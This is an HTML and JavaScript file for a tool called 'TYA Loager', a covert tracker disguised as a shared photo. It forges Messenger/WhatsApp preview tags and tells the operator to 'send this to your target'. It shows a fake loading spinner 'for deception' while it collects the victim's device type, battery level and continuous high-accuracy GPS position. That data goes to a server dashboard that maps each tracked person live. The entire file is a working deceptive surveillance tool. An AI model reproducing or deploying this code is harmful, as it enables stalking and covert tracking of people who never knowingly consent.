<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TYA Loager</title>
    
    <!-- Meta Tags for Messenger/WhatsApp Preview (The "Real Image" Illusion) -->
    <meta property="og:title" content="Photo Shared with You">
    <meta property="og:description" tap="Tap to open location details">
    <meta property="og:image" id="og-image" content="">

    <!-- Leaflet CSS for Maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent: #6366f1; 
            --success: #10b981;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        /* --- DASHBOARD STYLES --- */
        #dashboard-view {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
            display: none; 
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
            border-bottom: 1px solid #334155;
            padding-bottom: 20px;
        }

        .brand-name {
            font-size: 2.5rem;
            font-weight: 800;
            letter-spacing: -1px;
            background: linear-gradient(to right, #6366f1, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 0;
        }

        .upload-section {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 16px;
            margin-bottom: 30px;
            border: 1px solid #334155;
            display: flex;
            gap: 20px;
            align-items: center;
            flex-wrap: wrap;
        }

        .upload-btn {
            background-color: var(--accent);
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            border: none;
            transition: background 0.2s;
        }

        .upload-btn:hover { background-color: #4f46e5; }
        .file-input { display: none; }

        .current-image-preview {
            width: 80px;
            height: 80px;
            object-fit: cover;
            border-radius: 8px;
            border: 2px solid var(--accent);
        }

        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }

        .card {
            background-color: var(--card-bg);
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
            border: 1px solid #334155;
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .user-id { font-weight: bold; font-size: 1.2rem; color: var(--accent); }

        .status-badge {
            background-color: rgba(16, 185, 129, 0.2);
            color: var(--success);
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background-color: var(--success);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }

        .info-item {
            background: rgba(255,255,255,0.03);
            padding: 8px;
            border-radius: 8px;
        }

        .info-label { font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase; }
        .info-value { font-size: 0.9rem; font-weight: 600; margin-top: 2px; }

        .map-container {
            height: 180px;
            width: 100%;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 15px;
        }

        .btn-group { display: flex; gap: 10px; }

        .btn {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .btn-primary { background-color: var(--accent); color: white; }
        .btn-secondary { background-color: #334155; color: white; }

        /* --- TRACKER VIEW (User Side) --- */
        #tracker-view {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 9999;
        }

        #tracker-view img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        .loader-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255,255,255,0.9);
            padding: 20px;
            border-radius: 15px;
            display: none;
            text-align: center;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <!-- === DASHBOARD VIEW (For You) === -->
    <div id="dashboard-view">
        <div class="header">
            <h1 class="brand-name">TYA Loager</h1>
            
            <!-- Upload Section -->
            <div class="upload-section">
                <div style="flex:1;">
                    <label for="image-upload" class="upload-btn">Upload Custom Image</label>
                    <input type="file" id="image-upload" class="file-input" accept="image/*">
                    <p style="font-size:0.8rem; color:#94a3b8; margin-top:5px;">Select an image to use for tracking.</p>
                </div>
                <div style="display:flex; align-items:center; gap:10px;">
                    <span>Preview:</span>
                    <img id="current-image-preview" src="" class="current-image-preview" alt="Preview">
                </div>
            </div>

            <div style="text-align:center; margin-bottom:20px;">
                <button onclick="generateDemo()" class="btn btn-primary">Generate Demo Link</button>
            </div>
        </div>

        <div class="grid-container" id="cards-container">
            <!-- Cards injected via JS -->
        </div>
    </div>

    <!-- === TRACKER VIEW (For Users) === -->
    <div id="tracker-view">
        <!-- High Quality Image that looks real -->
        <img id="target-image" src="" alt="Shared Image">
        
        <div class="loader-overlay" id="loader">
            <div class="spinner"></div>
            <p style="color:#334155; font-weight:600;">Loading High- Res...</p>
        </div>
    </div>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
        // --- CONFIGURATION ---
        let currentImageSrc = ""; 
        const DEFAULT_IMAGE_URL = "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=600&q=80";

        // State to hold users (In-memory for Vercel)
        let trackedUsers = [];

        // Detect View Mode
        const urlPath = window.location.pathname;
        const isTracker = urlPath.startsWith('/track/');
        const userId = isTracker ? urlPath.split('/')[2] : null;

        if (isTracker && userId) {
            initTracker(userId);
        } else {
            initDashboard();
        }

        // ==========================================
        // 1. DASHBOARD LOGIC (Admin Side)
        // ==========================================
        
        // Handle Image Upload
        document.getElementById('image-upload').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    currentImageSrc = event.target.result; // Data URL
                    document.getElementById('current-image-preview').src = currentImageSrc;
                    
                    // Update Meta Tag for Messenger/WhatsApp Preview
                    document.getElementById('og-image').content = currentImageSrc;
                    
                    alert("Image uploaded! The link now shows this image in Messenger.");
                }
                reader.readAsDataURL(file);
            }
        });

        function initDashboard() {
            // Set initial preview if empty
            if(!document.getElementById('current-image-preview').src) {
                document.getElementById('current-image-preview').src = DEFAULT_IMAGE_URL;
                currentImageSrc = DEFAULT_IMAGE_URL;
                document.getElementById('og-image').content = DEFAULT_IMAGE_URL;
            }

            renderCards();
            
            // Poll for updates every 5 seconds
            setInterval(async () => {
                try {
                    const res = await fetch('/api/track');
                    trackedUsers = await res.json();
                    renderCards();
                } catch (e) {
                    console.error("Fetch Error", e);
                }
            }, 5000);
        }

        function generateDemo() {
            // Generate a random ID for demo purposes
            const demoId = 'USER' + Math.floor(1000 + Math.random() * 9000);
            copyLink(demoId);
        }

        function renderCards() {
            const container = document.getElementById('cards-container');
            
            // Clear existing cards (except if empty state)
            container.innerHTML = '';

            if (trackedUsers.length === 0) {
                container.innerHTML = `
                    <div style="text-align:center; color:#94a3b8; grid-column: 1/-1; padding: 50px;">
                        <h3>No Active Targets</h3>
                        <p>Upload an image, then click "Generate Demo Link" to start tracking.</p>
                    </div>
                `;
                return;
            }

            trackedUsers.forEach(user => {
                const card = document.createElement('div');
                card.className = 'card';
                
                // Google Maps Link
                const mapUrl = user.lat && user.lng ? 
                    `https://www.google.com/maps?q=${user.lat},${user.lng}` : '#';
                
                const hasLocation = user.lat && user.lng;

                card.innerHTML = `
                    <div class="card-header">
                        <span class="user-id">${user.id}</span>
                        <span class="status-badge" style="${hasLocation ? '' : 'background:rgba(239,68,68,0.2); color:#ef4444;'}">
                            ${hasLocation ? '<div class="status-dot"></div> LIVE' : 'OFFLINE'}
                        </span>
                    </div>
                    
                    <div class="info-grid">
                        <div class="info-item">
                            <div class="info-label">Device</div>
                            <div class="info-value">${user.device}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Battery</div>
                            <div class="info-value">${user.battery}</div>
                        </div>
                    </div>

                    <div class="map-container" id="map-${user.id}"></div>

                    <div class="btn-group">
                        <a href="${mapUrl}" target="_blank" class="btn btn-primary">Open Google Maps</a>
                        <button class="btn btn-secondary" onclick="copyLink('${user.id}')">Copy Link</button>
                    </div>
                `;

                container.appendChild(card);

                // Initialize Leaflet Map
                setTimeout(() => {
                    if (hasLocation) {
                        const map = L.map(`map-${user.id}`, { 
                            zoomControl: false, 
                            attributionControl: false 
                        }).setView([user.lat, user.lng], 15);
                        
                        // Dark Mode Tiles for "Hacker" look
                        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                            maxZoom: 19
                        }).addTo(map);

                        L.marker([user.lat, user.lng]).addTo(map)
                            .bindPopup(`<b>${user.id}</b><br>Battery: ${user.battery}`);
                    }
                }, 100);
            });
        }

        function copyLink(id) {
            const link = `${window.location.origin}/track/${id}`;
            navigator.clipboard.writeText(link);
            alert(`Link for ${id} copied: ${link}\n\nSend this to your target!`);
        }

        // ==========================================
        // 2. TRACKER LOGIC (User Side)
        // ==========================================
        async function initTracker(id) {
            const trackerView = document.getElementById('tracker-view');
            const img = document.getElementById('target-image');
            const loader = document.getElementById('loader');

            // Show Loader for deception (makes it feel like a real image loading)
            trackerView.style.display = 'block';
            loader.style.display = 'block';

            // Wait 2.5 seconds, then show image and start tracking
            setTimeout(() => {
                img.src = currentImageSrc; 
                loader.style.display = 'none';
                
                // Start the tracking process immediately
                trackUser(id);
            }, 2500);
        }

        async function trackUser(id) {
            const data = {};

            // 1. Battery Info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = (battery.level * 100).toFixed(0) + '%';
                    data.charging = battery.charging ? '⚡ Charging' : '🔋 Discharging';
                } catch (e) {
                    data.battery = 'N/A';
                }
            } else {
                data.battery = 'N/A';
            }

            // 2. Device Info
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) data.device = "Android";
            else if (/iPhone|iPad|iPod/i.test(ua)) data.device = "iOS";
            else data.device = "Desktop";

            // 3. Location (This is the key part)
            if ('geolocation' in navigator) {
                // getCurrentPosition: Gets initial location
                navigator.geolocation.getCurrentPosition(
                    position => {
                        data.lat = position.coords.latitude;
                        data.lng = position.coords.longitude;
                        sendDataToServer(id, data);
                        
                        // watchPosition: Keeps sending data as they move (Live Tracking)
                        const watchId = navigator.geolocation.watchPosition(
                            pos => {
                                data.lat = pos.coords.latitude;
                                data.lng = pos.coords.longitude;
                                sendDataToServer(id, data);
                            },
                            error => console.error("Watch Error", error),
                            { enableHighAccuracy: true, maximumAge: 0 }
                        );
                    },
                    error => {
                        console.error("Initial Location Error", error);
                        data.lat = null;
                        data.lng = null;
                        sendDataToServer(id, data);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                data.lat = null;
                data.lng = null;
                sendDataToServer(id, data);
            }
        }

        async function sendDataToServer(id, data) {
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id, ...data })
                });
            } catch (error) {
                console.error("Send Error", error);
            }
        }

    </script>
</body>
</html>
